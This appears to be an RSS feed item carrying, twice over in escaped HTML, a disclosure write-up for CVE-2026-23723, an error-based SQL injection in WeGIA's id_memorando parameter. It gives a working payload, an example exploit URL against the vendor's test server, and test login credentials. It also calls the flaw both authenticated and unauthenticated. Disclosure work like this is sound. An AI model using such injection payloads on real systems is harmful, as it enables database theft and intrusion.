item.description:
&lt;h2 id=&#34;cve-2026-23723-sql-injection-error-based-vulnerability-in-id_memorando-parameter-on-atendido_ocorrenciacontrole-endpoint&#34;&gt;CVE-2026-23723: SQL Injection (Error-Based) Vulnerability in &lt;code&gt;id_memorando&lt;/code&gt; Parameter on &lt;code&gt;Atendido_ocorrenciaControle&lt;/code&gt; Endpoint
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;CVE Publication: &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/CVERecord?id=CVE-2026-23723&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cve.org/CVERecord?id=CVE-2026-23723&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;An authenticated SQL Injection vulnerability was identified in the &lt;code&gt;Atendido_ocorrenciaControle&lt;/code&gt; endpoint via the &lt;code&gt;id_memorando&lt;/code&gt; parameter. This flaw allows for full database exfiltration, exposure of sensitive PII, and potential arbitrary file reads in misconfigured environments.&lt;/p&gt;
&lt;h2 id=&#34;details&#34;&gt;Details
&lt;/h2&gt;&lt;p&gt;Vulnerable Endpoint: &lt;code&gt;Atendido_ocorrenciaControle&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Parameter: &lt;code&gt;id_memorando&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;poc&#34;&gt;PoC
&lt;/h2&gt;&lt;h3 id=&#34;payload&#34;&gt;Payload:
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 AND extractvalue(1, concat(0x7e, @@Version))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;example-url&#34;&gt;Example url:
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://sec.wegia.org:8000/WeGIA/controle/control.php?nomeClasse=Atendido_ocorrenciaControle&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;metodo=listarTodosComAnexo&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;id_memorando=1%20AND%20extractvalue(1,%20concat(0x7e,%20@@version))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;steps-to-reproduce&#34;&gt;Steps to Reproduce:
&lt;/h3&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;Login to the WeGIA system (user:admin, password: wegia) and obtain a valid session cookie.&lt;/li&gt;
    &lt;li&gt;The vulnerability was confirmed on the official security testing server: &lt;code&gt;sec.wegia.org:8000&lt;/code&gt;.&lt;/li&gt;
    &lt;li&gt;Send a GET request to the vulnerable endpoint with the following payload:&lt;/li&gt;
  &lt;/ul&gt;
&lt;/p&gt;

item.content:encoded:
&lt;h2 id=&#34;cve-2026-23723-sql-injection-error-based-vulnerability-in-id_memorando-parameter-on-atendido_ocorrenciacontrole-endpoint&#34;&gt;CVE-2026-23723: SQL Injection (Error-Based) Vulnerability in &lt;code&gt;id_memorando&lt;/code&gt; Parameter on &lt;code&gt;Atendido_ocorrenciaControle&lt;/code&gt; Endpoint
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;CVE Publication: &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/CVERecord?id=CVE-2026-23723&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cve.org/CVERecord?id=CVE-2026-23723&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;An authenticated SQL Injection vulnerability was identified in the &lt;code&gt;Atendido_ocorrenciaControle&lt;/code&gt; endpoint via the &lt;code&gt;id_memorando&lt;/code&gt; parameter. This flaw allows for full database exfiltration, exposure of sensitive PII, and potential arbitrary file reads in misconfigured environments.&lt;/p&gt;
&lt;h2 id=&#34;details&#34;&gt;Details
&lt;/h2&gt;&lt;p&gt;Vulnerable Endpoint: &lt;code&gt;Atendido_ocorrenciaControle&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Parameter: &lt;code&gt;id_memorando&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;poc&#34;&gt;PoC
&lt;/h2&gt;&lt;h3 id=&#34;payload&#34;&gt;Payload:
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1 AND extractvalue(1, concat(0x7e, @@Version))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;example-url&#34;&gt;Example url:
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://sec.wegia.org:8000/WeGIA/controle/control.php?nomeClasse=Atendido_ocorrenciaControle&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;metodo=listarTodosComAnexo&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;id_memorando=1%20AND%20extractvalue(1,%20concat(0x7e,%20@@version))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;steps-to-reproduce&#34;&gt;Steps to Reproduce:
&lt;/h3&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;Login to the WeGIA system (user:admin, password: wegia) and obtain a valid session cookie.&lt;/li&gt;
    &lt;li&gt;The vulnerability was confirmed on the official security testing server: &lt;code&gt;sec.wegia.org:8000&lt;/code&gt;.&lt;/li&gt;
    &lt;li&gt;Send a GET request to the vulnerable endpoint with the following payload:&lt;/li&gt;
  &lt;/ul&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/p/cve-2026-23723/image.png&#34;
	width=&#34;1481&#34;
	height=&#34;573&#34;
	srcset=&#34;/p/cve-2026-23723/image_hu_50c6c393ec22c46a.png 480w, /p/cve-2026-23723/image_hu_ea035905a73cb2a0.png 1024w&#34;
	loading=&#34;lazy&#34;


		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;258&#34;
		data-flex-basis=&#34;620px&#34;

 /&gt;&lt;/p&gt;
&lt;p style=&#34;text-align: justify;&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;Observe that the system returns a error message, confirming the injection:&lt;/li&gt;
  &lt;/ul&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/p/cve-2026-23723/image-1.png&#34;
	width=&#34;681&#34;
	height=&#34;32&#34;
	srcset=&#34;/p/cve-2026-23723/image-1_hu_61812a024882cb4a.png 480w, /p/cve-2026-23723/image-1_hu_4211dac53e8c18cb.png 1024w&#34;
	loading=&#34;lazy&#34;


		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2128&#34;
		data-flex-basis=&#34;5107px&#34;

 /&gt;&lt;/p&gt;
&lt;h2 id=&#34;impact&#34;&gt;Impact
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;Unauthorized access to sensitive data (e.g., users, passwords, logs).&lt;/li&gt;
    &lt;li&gt;Database enumeration (schemas, tables, users, versions).&lt;/li&gt;
    &lt;li&gt;Escalation to RCE depending on DB configuration (e.g., xp_cmdshell, UDFs).&lt;/li&gt;
    &lt;li&gt;Full compromise of the application if chained with other vulnerabilities.&lt;/li&gt;
    &lt;li&gt;This issue affects all users and environments, as it does not require authentication and is reachable via a public endpoint.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/p&gt;
